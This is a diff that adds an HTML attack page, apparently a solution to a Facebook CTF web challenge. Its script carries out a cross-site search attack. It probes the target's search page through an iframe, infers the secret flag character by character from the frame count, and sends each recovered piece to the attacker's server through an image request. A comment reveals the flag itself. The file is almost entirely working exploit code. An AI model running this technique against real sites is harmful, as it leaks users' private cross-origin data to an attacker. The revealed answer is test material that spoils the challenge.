@@ -1,0 +1,41 @@
+<head>
+<meta http-Equiv="Cache-Control" Content="no-cache">
+<meta http-Equiv="Pragma" Content="no-cache">
+<meta http-Equiv="Expires" Content="0">
+</head>
+<body>
+    <script>
+        let charset = ""
+        let not_include = [37, 95]
+        for(var i = 32; i < 127; ++i)
+            if(!not_include.includes(i))
+            charset += String.fromCharCode(i)
+        function load_frame(){
+            let myframe = document.getElementById('hackframe')
+            document.getElementById('leak').src = "/flag_length?flag="+myframe.contentWindow.length;
+            let charset_counter = 0;
+            let found_flag = "fb{cr055_s173_l34"
+//fb{cr055_s173_l34|<5_4r4_c00ool!!}
+//Essentially a XS-search
+            myframe.onload = function(){
+                if(myframe.contentWindow.length > 0){ //right char
+                    found_flag += charset.charAt(charset_counter);
+                    charset_counter = 0;
+                    document.getElementById('leak').src = "/flag_leak?flag="+encodeURIComponent(found_flag);
+                    myframe.src = "http://challenges.fbctf.com:8082/search?query=" +encodeURIComponent(found_flag + charset.charAt(charset_counter));
+                } else {
+                    ++charset_counter;
+                    myframe.src = "http://challenges.fbctf.com:8082/search?query=" +encodeURIComponent(found_flag + charset.charAt(charset_counter));
+                }
+            }
+            myframe.src = "http://challenges.fbctf.com:8082/search?query=" +encodeURIComponent(found_flag + charset.charAt(charset_counter))
+        }
+
+    </script>
+
+    HAXX
+    <img id="leak" src="/flag_leak">
+
+    <iframe id="hackframe" src="http://challenges.fbctf.com:8082/search?query=fb{" onload="load_frame()">
+</body>
+
